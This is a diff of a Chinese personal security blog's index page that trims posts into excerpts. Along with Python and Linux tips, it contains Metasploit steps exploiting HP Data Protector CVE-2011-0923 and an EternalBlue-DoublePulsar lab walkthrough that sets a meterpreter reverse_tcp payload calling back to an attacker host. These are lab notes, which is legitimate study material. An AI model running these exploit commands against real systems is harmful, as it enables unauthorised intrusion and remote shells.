@@ -191,6 +191,88 @@
   
   
   <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
+    <link itemprop="mainEntityOfPage" href="https://ryaninf.github.io/2020/06/05/Spring-Boot-Actuators%E6%9C%AA%E6%8E%88%E6%9D%83GetShell/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/avatar.jpg">
+      <meta itemprop="name" content="r0yanx">
+      <meta itemprop="description" content="">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="r0yanx's Blog">
+    </span>
+      <header class="post-header">
+        <h2 class="post-title" itemprop="name headline">
+          
+            <a href="/2020/06/05/Spring-Boot-Actuators%E6%9C%AA%E6%8E%88%E6%9D%83GetShell/" class="post-title-link" itemprop="url">Spring Boot Actuators未授权GetShell</a>
+        </h2>
+
+        <div class="post-meta">
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-calendar"></i>
+              </span>
+              <span class="post-meta-item-text">发表于</span>
+
+              <time title="创建时间：2020-06-05 19:29:40" itemprop="dateCreated datePublished" datetime="2020-06-05T19:29:40+08:00">2020-06-05</time>
+            </span>
+              <span class="post-meta-item">
+                <span class="post-meta-item-icon">
+                  <i class="far fa-calendar-check"></i>
+                </span>
+                <span class="post-meta-item-text">更新于</span>
+                <time title="修改时间：2020-08-20 19:57:42" itemprop="dateModified" datetime="2020-08-20T19:57:42+08:00">2020-08-20</time>
+              </span>
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-folder"></i>
+              </span>
+              <span class="post-meta-item-text">分类于</span>
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/categories/%E6%BC%8F%E6%B4%9E/" itemprop="url" rel="index"><span itemprop="name">漏洞</span></a>
+                </span>
+            </span>
+
+          
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+          <p><strong>本文仅作为技术讨论及分享，严禁用于任何非法用途。</strong></p>
+<h3 id="漏洞介绍"><a href="#漏洞介绍" class="headerlink" title="漏洞介绍"></a>漏洞介绍</h3><p>actuator 是 springboot 提供的用来对应用系统进行自省和监控的功能模块。其提供的执行器端点分为两类：原生端点和用户自定义扩展端点，原生端点主要有：  </p>
+          <!--noindex-->
+            <div class="post-button">
+              <a class="btn" href="/2020/06/05/Spring-Boot-Actuators%E6%9C%AA%E6%8E%88%E6%9D%83GetShell/#more" rel="contents">
+                阅读全文 &raquo;
+              </a>
+            </div>
+          <!--/noindex-->
+        
+      
+    </div>
+
+    
+    
+    
+      <footer class="post-footer">
+        <div class="post-eof"></div>
+      </footer>
+  </article>
+  
+  
+  
+
+      
+  
+  
+  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
     <link itemprop="mainEntityOfPage" href="https://ryaninf.github.io/2020/04/01/Python%E8%AF%BB%E5%8F%96Excel%E5%90%88%E5%B9%B6%E5%8D%95%E5%85%83%E6%A0%BC/">
 
     <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
@@ -222,7 +304,7 @@
                   <i class="far fa-calendar-check"></i>
                 </span>
                 <span class="post-meta-item-text">更新于</span>
-                <time title="修改时间：2020-08-20 19:18:05" itemprop="dateModified" datetime="2020-08-20T19:18:05+08:00">2020-08-20</time>
+                <time title="修改时间：2020-08-20 19:23:29" itemprop="dateModified" datetime="2020-08-20T19:23:29+08:00">2020-08-20</time>
               </span>
             <span class="post-meta-item">
               <span class="post-meta-item-icon">
@@ -252,19 +334,14 @@
 </ul>
 <h3 id="方法"><a href="#方法" class="headerlink" title="方法"></a>方法</h3><p>xlrd提供了<code>sheet.merged_cells</code>用于获取页面中所有的合并单元格坐标。类似：</p>
 <figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">[(<span class="number">1</span>, <span class="number">4</span>, <span class="number">0</span>, <span class="number">1</span>)]</span><br></pre></td></tr></table></figure>
-<p>坐标从0开始算起，代表第1行到第4行（不包含4），第0列到第一列（不包含1）为合并单元格。</p>
-<p>这里有一个点要注意，xlrd官方说明中，需要在<code>open_workbook</code>时传入<code>formatting_info=True</code>，如果未设置此选项，获取到的合并单元格坐标为空，这点是很多文章没有提到的，可能是版本的变更问题：<br><img src="/2020/04/01/Python%E8%AF%BB%E5%8F%96Excel%E5%90%88%E5%B9%B6%E5%8D%95%E5%85%83%E6%A0%BC/2020-08-20-19-14-52.png"></p>
-<p>示例代码：</p>
-<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> xlrd</span><br><span class="line">wb = xlrd.open_workbook(<span class="string">&#x27;test.xls&#x27;</span>, formatting_info=<span class="literal">True</span>)</span><br><span class="line">sheet = wb.sheet_by_name(<span class="string">&#x27;Sheet1&#x27;</span>)</span><br><span class="line">mc = sheet.merged_cells</span><br><span class="line">print(mc)</span><br></pre></td></tr></table></figure>
-<p>结果输出：</p>
-<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">[(<span class="number">0</span>, <span class="number">2</span>, <span class="number">0</span>, <span class="number">2</span>)]</span><br></pre></td></tr></table></figure>
-
-<h3 id="完整代码"><a href="#完整代码" class="headerlink" title="完整代码"></a>完整代码</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> xlrd</span><br><span class="line"><span class="keyword">from</span> openpyxl <span class="keyword">import</span> Workbook</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">get_merged_cells_value</span>(<span class="params">sheet, row_index, col_index</span>):</span></span><br><span class="line">    <span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">    判断单元格是否为合并单元格，是则返回合并单元格的值，否则返回None</span></span><br><span class="line"><span class="string">    &quot;&quot;&quot;</span></span><br><span class="line">    merged_cells = sheet.merged_cells</span><br><span class="line">    <span class="keyword">for</span> rlo, rhi, clo, chi <span class="keyword">in</span> merged_cells:</span><br><span class="line">        <span class="comment"># 判断行下标是否在合并单元格范围内</span></span><br><span class="line">        <span class="keyword">if</span> row_index <span class="keyword">in</span> range(rlo, rhi):</span><br><span class="line">            <span class="comment"># 判断列下标是否在合并单元格范围内</span></span><br><span class="line">            <span class="keyword">if</span> col_index <span class="keyword">in</span> range(clo, chi):</span><br><span class="line">                <span class="comment"># 返回单元格值</span></span><br><span class="line">                <span class="keyword">return</span> sheet.cell_value(rlo, clo)</span><br><span class="line">    <span class="keyword">return</span> <span class="literal">None</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">main</span>():</span></span><br><span class="line">    <span class="comment"># 打开Excel</span></span><br><span class="line">    wb = xlrd.open_workbook(<span class="string">&#x27;test.xls&#x27;</span>, formatting_info=<span class="literal">True</span>)</span><br><span class="line">    <span class="comment"># 指定工作表</span></span><br><span class="line">    sheet = wb.sheet_by_name(<span class="string">&#x27;Sheet2&#x27;</span>)</span><br><span class="line">    <span class="comment"># 获取总行数</span></span><br><span class="line">    rows_num = sheet.nrows</span><br><span class="line">    <span class="comment"># 获取总列数</span></span><br><span class="line">    cols_num = sheet.ncols</span><br><span class="line">    <span class="comment"># 遍历行</span></span><br><span class="line">    <span class="keyword">for</span> ri <span class="keyword">in</span> range(rows_num):</span><br><span class="line">        row = sheet.row_values(ri)</span><br><span class="line">        <span class="comment"># 遍历列</span></span><br><span class="line">        <span class="keyword">for</span> ci <span class="keyword">in</span> range(cols_num):</span><br><span class="line">            <span class="comment"># 获取合并单元格值，不是合并单元格的返回None</span></span><br><span class="line">            merged_cell_value = get_merged_cells_value(sheet, ri, ci)</span><br><span class="line">            <span class="comment"># 判断单元格是否在合并单元格清单中，是的话则返回正确的单元格值</span></span><br><span class="line">            <span class="keyword">if</span> merged_cell_value:</span><br><span class="line">                <span class="comment"># 修改行中合并单元格值为正确值</span></span><br><span class="line">                row[ci] = merged_cell_value</span><br><span class="line">        <span class="comment"># 打印列结果</span></span><br><span class="line">        print(row)</span><br><span class="line">        <span class="comment"># 后面的根据实际需要进行加工</span></span><br><span class="line">        <span class="keyword">pass</span></span><br><span class="line">        </span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    main()</span><br></pre></td></tr></table></figure>
-
-<h3 id="结果输出"><a href="#结果输出" class="headerlink" title="结果输出"></a>结果输出</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">[<span class="string">&#x27;列1&#x27;</span>, <span class="string">&#x27;列2&#x27;</span>, <span class="string">&#x27;列3&#x27;</span>]</span><br><span class="line">[<span class="string">&#x27;A&#x27;</span>, <span class="number">1.0</span>, <span class="number">4.0</span>]</span><br><span class="line">[<span class="string">&#x27;A&#x27;</span>, <span class="number">2.0</span>, <span class="number">5.0</span>]</span><br><span class="line">[<span class="string">&#x27;A&#x27;</span>, <span class="number">3.0</span>, <span class="number">6.0</span>]</span><br></pre></td></tr></table></figure>
-
-<h3 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h3><p><a target="_blank" rel="noopener" href="https://xlrd.readthedocs.io/en/latest/api.html?highlight=merged_cells#xlrd.sheet.Sheet.merged_cells">xlrd官方文档</a><br><a target="_blank" rel="noopener" href="https://www.jianshu.com/p/24a693fff4a3">python3读取Excel(包含合并单元格)</a></p>
-
+          <!--noindex-->
+            <div class="post-button">
+              <a class="btn" href="/2020/04/01/Python%E8%AF%BB%E5%8F%96Excel%E5%90%88%E5%B9%B6%E5%8D%95%E5%85%83%E6%A0%BC/#more" rel="contents">
+                阅读全文 &raquo;
+              </a>
+            </div>
+          <!--/noindex-->
+        
       
     </div>
 
@@ -314,7 +391,7 @@
                   <i class="far fa-calendar-check"></i>
                 </span>
                 <span class="post-meta-item-text">更新于</span>
-                <time title="修改时间：2020-08-20 19:10:47" itemprop="dateModified" datetime="2020-08-20T19:10:47+08:00">2020-08-20</time>
+                <time title="修改时间：2020-08-20 19:23:14" itemprop="dateModified" datetime="2020-08-20T19:23:14+08:00">2020-08-20</time>
               </span>
             <span class="post-meta-item">
               <span class="post-meta-item-icon">
@@ -341,17 +418,15 @@
 <li>xargs占位符<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">echo</span> aaa |xargs -I &#123;&#125; python3 test.py &#123;&#125; &#123;&#125;.xlsx</span><br></pre></td></tr></table></figure></li>
 <li>查看进程启动时间<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ps -eo pid,lstart,etime,cmd | grep nginx</span><br></pre></td></tr></table></figure></li>
 <li>找出大于500m的文件<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">find / -<span class="built_in">type</span> f -size +500M -print0 |xargs -0 ls -l</span><br></pre></td></tr></table></figure></li>
-<li>Debian显示已安装的软件包<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">apt list --installed</span><br></pre></td></tr></table></figure></li>
-<li>批量杀进程<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ps aux |grep hydra |awk <span class="string">&#x27;&#123;printf &quot;%s\n&quot;, $2&#125;&#x27;</span> |xargs <span class="built_in">kill</span> -9</span><br></pre></td></tr></table></figure></li>
-<li>apt-get配置代理<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">export</span> http_proxy=http://192.168.137.1:1080</span><br></pre></td></tr></table></figure></li>
-<li>wget设置代理<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">wget https://www.python.org/ftp/python/3.5.2/Python-3.5.2rc1.tgz -e <span class="string">&#x27;https_proxy=http://192.168.137.1:1080&#x27;</span></span><br></pre></td></tr></table></figure></li>
-<li>Debian设置SSH自启动<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">update-rc.d  ssh <span class="built_in">enable</span></span><br></pre></td></tr></table></figure></li>
-<li>Kali设置阿里云源<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">修改/etc/apt/sources.list文件为以下内容：</span><br><span class="line">deb https://mirrors.aliyun.com/kali/ kali-rolling main non-free contrib</span><br><span class="line">deb-src https://mirrors.aliyun.com/kali/ kali-rolling main non-free contrib</span><br></pre></td></tr></table></figure></li>
-<li>查找重复行并统计出现次数，例：统计各IP出现次数 <figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cat ip.txt |grep -E -o <span class="string">&quot;(25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)\.(25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)\.(25[0-5]|2[0-4][0-9]|[01]?[0-9][ 0-9]?)\.(25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)&quot;</span>  |sort |uniq -c &gt; ipncount.txt</span><br></pre></td></tr></table></figure>
-
-</li>
-</ol>
-<h3 id="本文持续更新"><a href="#本文持续更新" class="headerlink" title="本文持续更新"></a>本文持续更新</h3>
+<li>Debian显示已安装的软件包<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">apt list --installed</span><br></pre></td></tr></table></figure></li></ol>
+          <!--noindex-->
+            <div class="post-button">
+              <a class="btn" href="/2020/01/03/Linux%E5%91%BD%E4%BB%A4%E5%A4%87%E5%BF%98/#more" rel="contents">
+                阅读全文 &raquo;
+              </a>
+            </div>
+          <!--/noindex-->
+        
       
     </div>
 
@@ -401,7 +476,7 @@
                   <i class="far fa-calendar-check"></i>
                 </span>
                 <span class="post-meta-item-text">更新于</span>
-                <time title="修改时间：2020-08-20 17:52:43" itemprop="dateModified" datetime="2020-08-20T17:52:43+08:00">2020-08-20</time>
+                <time title="修改时间：2020-08-20 19:23:43" itemprop="dateModified" datetime="2020-08-20T19:23:43+08:00">2020-08-20</time>
               </span>
             <span class="post-meta-item">
               <span class="post-meta-item-icon">
@@ -430,22 +505,15 @@
 <li><p>去除HTTP协议头，<code>http://baidu.com</code>-&gt;<code>baidu.com</code></p>
 <figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">domain = re.sub(<span class="string">&#x27;https?://&#x27;</span>, <span class="string">&#x27;&#x27;</span>, domain, flags=re.IGNORECASE)</span><br></pre></td></tr></table></figure></li>
 <li><p>把字符串内多个空格合并成一个空格，<code>&#39;　　　&#39;</code>-&gt;<code>&#39; &#39;</code></p>
-<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">line = re.sub(<span class="string">&#x27; +&#x27;</span>, <span class="string">&#x27; &#x27;</span>, line)</span><br></pre></td></tr></table></figure></li>
-<li><p>超大文件读取, 超大文件读取使用fileinput，会逐行读取，而readlines会一次读完导致内存爆炸</p>
-<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># def read_ip_history_file(filename):</span></span><br><span class="line"><span class="comment">#     with open(filename, &#x27;r&#x27;, encoding=&#x27;utf-8&#x27;) as f:</span></span><br><span class="line"><span class="comment">#         for line in f.readlines():</span></span><br><span class="line"><span class="comment">#             line = line.strip()</span></span><br><span class="line"><span class="comment">#             yield line</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">read_ip_history_file</span>(<span class="params">filename</span>):</span></span><br><span class="line">    <span class="keyword">for</span> line <span class="keyword">in</span> fileinput.input([filename], openhook = fileinput.hook_encoded(<span class="string">&quot;utf-8&quot;</span>)):</span><br><span class="line">        <span class="keyword">yield</span> line</span><br><span class="line"> <span class="comment"># 或者</span></span><br><span class="line"> <span class="function"><span class="keyword">def</span> <span class="title">read_ip_history_file</span>(<span class="params">filename</span>):</span></span><br><span class="line">     <span class="keyword">with</span> open(filename, <span class="string">&#x27;r&#x27;</span>, encoding=<span class="string">&#x27;utf-8&#x27;</span>) <span class="keyword">as</span> f:</span><br><span class="line">         <span class="keyword">for</span> line <span class="keyword">in</span> f:</span><br><span class="line">             line = line.strip()</span><br><span class="line">             <span class="keyword">yield</span> line</span><br></pre></td></tr></table></figure>
-</li>
-<li><p>日期转换</p>
-<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 字符串格式化为日期对象</span></span><br><span class="line">mail_date = <span class="string">&#x27;2019-09-29 04:55:46&#x27;</span></span><br><span class="line">strdate = datetime.datetime.strptime(mail_date, <span class="string">&#x27;%Y-%m-%d %H:%M:%S&#x27;</span>)</span><br><span class="line"><span class="comment"># 日期对象格式化为字符串对象</span></span><br><span class="line">strdate.strftime(<span class="string">&#x27;%Y%m%d&#x27;</span>)</span><br></pre></td></tr></table></figure></li>
-<li><p>子线程随父线程退出</p>
-<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">write_flag_task = Thread(target=saveFlag, args=(LOG_FILE_NAME, ))</span><br><span class="line"><span class="comment"># 子线程随父进程退出</span></span><br><span class="line">write_flag_task.setDaemon(<span class="literal">True</span>)</span><br><span class="line">write_flag_task.start()</span><br></pre></td></tr></table></figure></li>
-<li><p>拼接脚本依赖文件的绝对路径。比如：脚本依赖一个数据库文件，未防止他人使用脚本时路径异常读不到数据库，需要拼接路径。</p>
-<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">DBPATH = <span class="string">&#x27;123.db&#x27;</span></span><br><span class="line">script_path = sys.argv[<span class="number">0</span>]</span><br><span class="line">script_dir, _ = os.path.split(script_path)</span><br><span class="line">DBPATH = os.path.join(script_dir, DBPATH)</span><br></pre></td></tr></table></figure></li>
-<li><p>提取中文的正则表达式</p>
-<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">s = <span class="string">&#x27;123你好a&#x27;</span></span><br><span class="line">re.findall(<span class="string">&#x27;[\u4e00-\u9fa5]+&#x27;</span>, s)</span><br><span class="line">输出：[<span class="string">&#x27;你好&#x27;</span>]</span><br></pre></td></tr></table></figure>
-
-</li>
-</ol>
-<h3 id="本文持续更新"><a href="#本文持续更新" class="headerlink" title="本文持续更新"></a>本文持续更新</h3>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">line = re.sub(<span class="string">&#x27; +&#x27;</span>, <span class="string">&#x27; &#x27;</span>, line)</span><br></pre></td></tr></table></figure></li></ol>
+          <!--noindex-->
+            <div class="post-button">
+              <a class="btn" href="/2019/09/16/Python%E5%B8%B8%E7%94%A8%E4%BB%A3%E7%A0%81%E5%A4%87%E5%BF%98/#more" rel="contents">
+                阅读全文 &raquo;
+              </a>
+            </div>
+          <!--/noindex-->
+        
       
     </div>
 
@@ -569,7 +637,7 @@
                   <i class="far fa-calendar-check"></i>
                 </span>
                 <span class="post-meta-item-text">更新于</span>
-                <time title="修改时间：2020-08-20 17:42:55" itemprop="dateModified" datetime="2020-08-20T17:42:55+08:00">2020-08-20</time>
+                <time title="修改时间：2020-08-20 19:24:01" itemprop="dateModified" datetime="2020-08-20T19:24:01+08:00">2020-08-20</time>
               </span>
             <span class="post-meta-item">
               <span class="post-meta-item-icon">
@@ -596,15 +664,14 @@
 <h3 id="HP-Data-Protector远程命令执行（CVE-2011-0923）"><a href="#HP-Data-Protector远程命令执行（CVE-2011-0923）" class="headerlink" title="HP Data Protector远程命令执行（CVE-2011-0923）"></a>HP Data Protector远程命令执行（CVE-2011-0923）</h3><p>HP Data Protector存在一个命令执行漏洞，恶意用户可以发送数据包导致这种特殊的服务来执行任意shell命令。这个漏洞在内网中很常见，端口为TCP<code>5555</code>，基本上一打一个准，这里说下利用过程，以作记录。</p>
 <h3 id="正常利用过程"><a href="#正常利用过程" class="headerlink" title="正常利用过程"></a>正常利用过程</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">msf5 &gt; use exploit/linux/misc/hp_data_protector_cmd_exec</span><br><span class="line">msf5 exploit(linux/misc/hp_data_protector_cmd_exec) &gt; <span class="built_in">set</span> rhosts 1.1.1.1</span><br><span class="line">msf5 exploit(linux/misc/hp_data_protector_cmd_exec) &gt; exploit</span><br></pre></td></tr></table></figure>
 <p><img src="/2019/09/03/HP-Data-Protector%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8%E8%AE%B0%E5%BD%95/2020-08-20-17-40-26.png"></p>
-<h3 id="网络受限情况下的利用过程"><a href="#网络受限情况下的利用过程" class="headerlink" title="网络受限情况下的利用过程"></a>网络受限情况下的利用过程</h3><p>某些特殊受限网络情况下，无法连接<code>Bind Shell</code>或者<code>Reverse Shell</code>，可以使用<code>cmd/unix/generic</code>这个<code>payload</code>执行命令并获取回显。</p>
-<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">msf5 &gt; use exploit/linux/misc/hp_data_protector_cmd_exec</span><br><span class="line">msf5 exploit(linux/misc/hp_data_protector_cmd_exec) &gt; <span class="built_in">set</span> rhosts 1.1.1.1</span><br><span class="line">msf5 exploit(linux/misc/hp_data_protector_cmd_exec) &gt; <span class="built_in">set</span> payload cmd/unix/generic </span><br><span class="line">msf5 exploit(linux/misc/hp_data_protector_cmd_exec) &gt; <span class="built_in">set</span> cmd whoami</span><br><span class="line">msf5 exploit(linux/misc/hp_data_protector_cmd_exec) &gt; exploit</span><br></pre></td></tr></table></figure>
-<p><img src="/2019/09/03/HP-Data-Protector%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8%E8%AE%B0%E5%BD%95/2020-08-20-17-41-18.png"></p>
-<h3 id="修复建议"><a href="#修复建议" class="headerlink" title="修复建议"></a>修复建议</h3><ol>
-<li>升级Data Protector到A.06.20 或更高版本</li>
-<li>对服务启用加密</li>
-<li>参考：<br><a target="_blank" rel="noopener" href="http://www.zerodayinitiative.com/advisories/ZDI-11-055/">http://www.zerodayinitiative.com/advisories/ZDI-11-055/</a><br><a target="_blank" rel="noopener" href="http://seclists.org/bugtraq/2011/Feb/73">http://seclists.org/bugtraq/2011/Feb/73</a><br><a target="_blank" rel="noopener" href="http://www.nessus.org/u?6ca03389">http://www.nessus.org/u?6ca03389</a></li>
-</ol>
-
+          <!--noindex-->
+            <div class="post-button">
+              <a class="btn" href="/2019/09/03/HP-Data-Protector%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8%E8%AE%B0%E5%BD%95/#more" rel="contents">
+                阅读全文 &raquo;
+              </a>
+            </div>
+          <!--/noindex-->
+        
       
     </div>
 
@@ -654,7 +721,7 @@
                   <i class="far fa-calendar-check"></i>
                 </span>
                 <span class="post-meta-item-text">更新于</span>
-                <time title="修改时间：2020-08-20 17:37:37" itemprop="dateModified" datetime="2020-08-20T17:37:37+08:00">2020-08-20</time>
+                <time title="修改时间：2020-08-20 19:24:19" itemprop="dateModified" datetime="2020-08-20T19:24:19+08:00">2020-08-20</time>
               </span>
             <span class="post-meta-item">
               <span class="post-meta-item-icon">
@@ -680,22 +747,14 @@
           <p><strong>本文仅作为技术讨论及分享，严禁用于任何非法用途。</strong></p>
 <h3 id="警告"><a href="#警告" class="headerlink" title="警告"></a>警告</h3><p>本文无任何技术水平，仅用来记录一次<code>Eternalblue-Doublepulsar</code>利用过程，作笔记使用。</p>
 <h3 id="环境介绍"><a href="#环境介绍" class="headerlink" title="环境介绍"></a>环境介绍</h3><p>本次实验在虚拟机中进行，攻击机与靶机位于同一局域网内。<br>攻击机：<code>Kali Linux</code>（IP：<code>192.168.200.130</code>）<br>靶机：<code>Windows 7 x64</code>（IP：<code>192.168.200.142</code>）</p>
-<h3 id="安装"><a href="#安装" class="headerlink" title="安装"></a>安装</h3><p>下载<code>Eternalblue-Doublepulsar</code>到<code>/root</code>目录，这里最好不要改，因为工具里面配置的默认目录就是这个目录，改了的话相应的也要在<code>msf</code>里面改<code>DOUBLEPULSARPATH</code>、<code>ETERNALBLUEPATH</code>这两个变量</p>
-<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">cd</span> /root</span><br><span class="line">git <span class="built_in">clone</span> https://github.com/ElevenPaths/Eternalblue-Doublepulsar-Metasploit.git</span><br></pre></td></tr></table></figure>
-<p>复制<code>eternalblue_doublepulsar.rb</code>到<code>/usr/share/metasploit-framework/modules/exploits/windows/smb/</code>目录</p>
-<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">cd</span> Eternalblue-Doublepulsar-Metasploit/</span><br><span class="line">cp eternalblue_doublepulsar.rb /usr/share/metasploit-framework/modules/exploits/windows/smb/</span><br></pre></td></tr></table></figure>
-<p>安装依赖</p>
-<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">dpkg --add-architecture i386 &amp;&amp; apt-get update &amp;&amp; apt-get install wine32 --fix-missing</span><br></pre></td></tr></table></figure>
-<p>创建<code>.wine/drive_c</code>目录，这里不创建的话后面<code>msf</code>利用漏洞时会出现目录不存在错误</p>
-<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mkdir -p /root/.wine/drive_c</span><br></pre></td></tr></table></figure>
-
-<h3 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="漏洞利用"></a>漏洞利用</h3><p>启动<code>msfconsole</code>，如果你已经启动了，可以使用<code>reload_all</code>重新加载<code>msf</code>模块来引入刚下载的模块</p>
-<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">msfconsole</span><br></pre></td></tr></table></figure>
-<p>使用漏洞利用模块，值得注意的一点是需要设置<code>PROCESSINJECT</code>这一变量值，在本次实验中，使用默认值并没有成功，修改<code>PROCESSINJECT</code>为<code>explorer.exe</code>成功拿到<code>meterpreter shell</code></p>
-<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">use exploit/windows/smb/eternalblue_doublepulsar</span><br><span class="line"><span class="built_in">set</span> rhost 192.168.200.142</span><br><span class="line"><span class="built_in">set</span> payload windows/x64/meterpreter/reverse_tcp</span><br><span class="line"><span class="built_in">set</span> lhost 192.168.200.130</span><br><span class="line"><span class="built_in">set</span> PROCESSINJECT explorer.exe</span><br><span class="line">run</span><br></pre></td></tr></table></figure>
